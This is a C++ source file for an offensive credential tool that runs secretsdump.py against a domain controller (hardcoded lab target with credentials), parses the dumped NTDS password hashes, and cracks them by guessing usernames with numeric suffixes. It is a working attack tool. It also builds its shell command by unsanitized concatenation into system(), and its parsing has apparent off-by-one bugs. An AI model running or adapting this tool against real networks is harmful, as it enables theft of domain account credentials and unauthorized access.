#include <iostream>
#include <vector>
#include "ntlm.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <unordered_map>
#include <regex>
using namespace std;

class Cracker {
    public:
        string target;

        std::vector<string> generate(string username) {
            std::vector<string> usernames;
            std::string busername = username;

            for (const auto& extension : extensions) {    
                username.append(extension);
                usernames.push_back(username);
                username = busername;
            }
            // std::cout << vec[1] << " Wordlist";
            return usernames;
        }

        std::pair<bool, string> crack(std::vector<string> wordlist, const char* hash){
            for (int i = 0; i < wordlist.size(); i++) {
                const char* generated_hash = gen_ntlm(wordlist[i]);
                // std::cout << wordlist[i] << std::endl;
                if (std::strcmp(hash, generated_hash) == 0) {
                    return std::make_pair(true, wordlist[i]);
                }
            }
            return std::make_pair(false, "");
        }
        
        string get_ntds() {
            std::string command = "/usr/bin/python3 ./scripts/secretsdump.py ";
            std::stringstream ss;
            ss << command << target << " > /tmp/output.txt";
            command = ss.str();
            system(command.c_str());
            ifstream fin("/tmp/output.txt");
            string output = "";
            while (fin) {
                string line;
                getline(fin, line);
                output += line + "\n";
            }
            return output;
        }

        std::unordered_map<std::string, std::string>  parse_hashes(const std::string& input) {        
            std::unordered_map<std::string, std::string> result;
            std::regex re("nthash\\)(.*?)\\[\\*\\]");
            std::string modified_input = input; // Create a non-const copy of the input string
            std::string helper_for_regex = "\n";
            std::smatch match;
            size_t pos = 0;
            std::string matched_str;
            std::vector<std::string> split_result;
            std::vector<std::string> split_result_line;
            std::string token;
            std::string token_line;
            std::istringstream iss("");
            std::istringstream iss_line("");
            std::unordered_map<std::string, std::string> creds;

            while ((pos = modified_input.find(helper_for_regex, pos)) != std::string::npos) {
                modified_input.replace(pos, helper_for_regex.length(), "^");
                pos += 6; // Move past the replaced string
            }
            
            if (std::regex_search(modified_input, match, re)) {
                // std::cout << "Found it!: " << match[1] << std::endl;
                matched_str = match[1].str();
            };

            iss.str(matched_str);
            
            while (std::getline(iss, token, '^')){
                split_result.push_back(token);
            }

            for (const auto& str : split_result) {
                iss_line.clear();
                split_result_line.clear();
                iss_line.str(str);

                while (std::getline(iss_line, token, ':')){
                    split_result_line.push_back(token);
                }
                if (split_result_line.size() >= 3) {
                    creds[split_result_line[0]] = split_result_line[3];
                }
            }
            return creds;
        }

        void launch() {
            std::string output = get_ntds();
            std::unordered_map<std::string, std::string> creds = parse_hashes(output);
            for (const auto& kv : creds) {
                std::vector<string> wl = generate(kv.first);
                std::pair<bool, string> crack_status = crack(wl, kv.second.c_str());
                // std::cout << kv.second.c_str() << std::endl;
                if (crack_status.first) {
                    std::cout << "Password Cracked: username is " 
                        << kv.first 
                        << " password is " 
                        << crack_status.second 
                        << std::endl;
                }
            }
        }

    private:
        std::vector<std::string> extensions = {
            "123",
            "1234",
            "12345",
            "123456",
            "001",
            "002",
            "003",
            "004",
            "005",
            "007",
            "008",
            "009"
    };
};

int main() {
    Cracker C;
    C.target = "testuser:123456@172.16.57.2";
    C.launch();
    return 0;
}
